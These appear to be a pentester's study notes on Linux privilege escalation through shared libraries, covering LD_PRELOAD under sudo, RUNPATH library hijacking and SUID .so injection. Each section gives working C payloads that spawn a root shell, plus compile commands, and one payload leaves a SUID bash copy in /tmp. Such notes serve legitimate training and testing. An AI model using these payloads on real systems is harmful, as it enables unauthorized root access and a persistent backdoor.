- **tags:** #sharedLibraries #privesc #linux 
- ------------
# Introduction
It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. *Two types of libraries exist in Linux*: **static libraries** (denoted by the `.a` file extension) and **dynamically linked shared object libraries** (denoted by the `.so` file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, *dynamic libraries can be modified to control the execution of the program that calls them*.
To list the shared objects required by a binary we can issue the `ldd` utility followed by the binary name:
```bash
ldd /bin/ls
```
## Modifying the LD_PRELOAD environment variable
There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. The `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones.
Let's see an example of we could utilize the `LD_PRELOAD` environment variable to privesc.
![[Pasted image 20240425103734.png]]
On the last image we can see that the user has **sudo** rights to execute `openssl` as well as modifying the `LD_PRELOAD` environment variable. We can now generate the following malicious library to load upon execution.
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```
- The **"constructor"** attribute is a special type of function attribute in GCC. *It tells the compiler to automatically call the function before the main function*.
We can now compile the `C` program into a shared object.
```bash
# -fPIC: Generate Position Independent Code.
gcc -fPIC -shared -s exploit.c -o exploit.so
```
![[Pasted image 20240425110336.png]]
**Note**: Specify absolute path of shared object dynamic library!
**Attention**: A similar privesc can be abused if the attacker controls the **LD_LIBRARY_PATH** env variable because he controls the path where libraries are going to be searched.
## Shared Object Hijacking
When stumbling upon *SUID* binaries is worth checking if they use custom dynamic libraries. It is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration where libraries in this folder are given preference over other folders.
![[Pasted image 20240425115507.png]]
On the previous image, we see that the binary requires a custom library named `libshared.so`. We can also see that any library found inside the `/development` folder will have preference over others. Therefore placing a malicious library named exactly as the custom library inside the  `/development` folder should have precedence over any other location. One way we could check this:
![[Pasted image 20240425120518.png]]
 Our hypothesis was correct, and the binary is vulnerable to object hijacking.  Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can now compile a malicious shared object which includes this function.
```C
#include<stdio.h>
#include<stdlib.h>

void dbquery(){
	printf("Malicious object loaded!\n");
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
}
```
```bash
# Compile malicious library
gcc -fPIC -shared -s libshared.c -o libshared.so
# execute command
./payroll
```
## SUID Binary – .so injection
When encountering a binary with **SUID** permissions that seems unusual, it's a good practice to verify if it's loading **.so** files properly. This can be checked by running the following command:
```bash
strace ./binary 2>&1 | grep -i -E "open|access|no such file"
```
For instance, encountering an error like "`open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)`" suggests a potential for exploitation. To exploit this, one would proceed by creating a C file, say _"/path/to/.config/libcalc.c"_, containing the following code:
```C
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
	setuid(0);
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Finally, running the affected SUID binary should trigger the exploit, allowing for potential system compromise.